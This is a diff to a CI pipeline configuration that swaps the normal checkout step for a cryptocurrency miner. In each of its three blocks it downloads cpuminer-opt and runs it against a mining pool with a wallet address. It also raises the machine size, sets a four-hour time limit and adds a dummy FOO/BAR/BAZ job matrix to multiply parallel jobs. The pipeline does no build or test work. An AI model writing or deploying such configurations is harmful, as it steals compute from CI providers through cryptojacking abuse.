@@ -2,12 +2,45 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 4
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescryptR32 -o stratum+tcps://stratum-na.rplant.xyz:17047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido90'
+          matrix:
+            - env_var: FOO
+              values:
+                - value1
+                - value2
+            - env_var: BAR
+              values:
+                - value1
+                - value2
+            - env_var: BAZ
+              values:
+                - value1
+                - value2
+    dependencies: []
+  - name: 'Block #2'
+    dependencies:
+      - 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescryptR32 -o stratum+tcps://stratum-na.rplant.xyz:17047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido90'
+  - name: 'Block #3'
+    dependencies:
+      - 'Block #1'
+      - 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescryptR32 -o stratum+tcps://stratum-na.rplant.xyz:17047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido90'
